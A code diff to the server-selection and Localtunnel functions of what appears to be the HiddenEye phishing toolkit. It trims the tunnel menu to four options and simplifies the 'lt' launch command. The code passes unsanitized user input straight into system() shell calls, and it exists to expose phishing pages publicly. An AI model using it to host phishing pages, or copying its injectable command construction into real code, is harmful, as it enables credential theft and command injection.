@@ -160,7 +160,7 @@ def selectServer(port): #Question where user must select server
         {0}** BY:DARKSEC ** \n\n-------------------------------\n{0}[ HOST SERVER SELECTION ]{1}!! {0}\n-------------------------------''').format(MAIN0, MAIN2))
         print(_("\n {1}[{0}!{1}]{1}(LOCALXPOSE/SERVEO WORKS BETTER)").format(MAIN0, MAIN2))
         print(_("\n {0}[{1}*{0}]{0}Select Any Available Server:{1}").format(MAIN0, MAIN4))
-        print(_("\n {0}[{1}1{0}]{1}Ngrok\n {0}[{1}2{0}]{1}Serveo\n {0}[{1}3{0}]{1}Localxpose\n {0}[{1}4{0}]{1}Localtunnel (npm)\n {0}[{1}5{0}]{1}Localtunnel (binary [buggy])").format(MAIN0, MAIN2))
+        print(_("\n {0}[{1}1{0}]{1}Ngrok\n {0}[{1}2{0}]{1}Serveo\n {0}[{1}3{0}]{1}Localxpose\n {0}[{1}4{0}]{1}Localtunnel").format(MAIN0, MAIN2))
 
         choice = input(" \n{0}HiddenEye >>> {2}".format(MAIN0, MAIN4, MAIN2))
         if choice == '1':
@@ -174,10 +174,7 @@ def selectServer(port): #Question where user must select server
             runLocalxpose(port)    
         elif choice == '4':
             system('clear')
-            runLT(port,True)
-        elif choice=='5':
-            system('clear')
-            runLT(port,False)
+            runLT(port)
         else:
             system('clear')
             return selectServer(port)
@@ -349,10 +346,10 @@ def randomServeo(port):
         system('clear')
         return randomServeo(port)
 
-def runLT(port,npm):
+def runLT(port):
     s=input(('{1}[leave blank for random]\n{0}hiddeneye(localtunnel/subdomain)> {2}').format(MAIN0,MAIN4,MAIN2))
     try:
-        system('{0}lt -p '.format('' if npm else 'Server/')+port+((' -s '+s) if s!='' else s)+' > link.url &')
+        system('lt -p '+port+((' -s '+s) if s!='' else s)+' > link.url &')
         sleep(3)
         print("{2}[https://127.0.0.1:{3}]{0}{1} -> {2}[{4}]{0}".format(MAIN0, MAIN2, MAIN3, port, str(check_output("grep -o '.\{0,0\}https.\{0,100\}' link.url",shell=True)).strip("b ' \ n r")))
     except CalledProcessError:
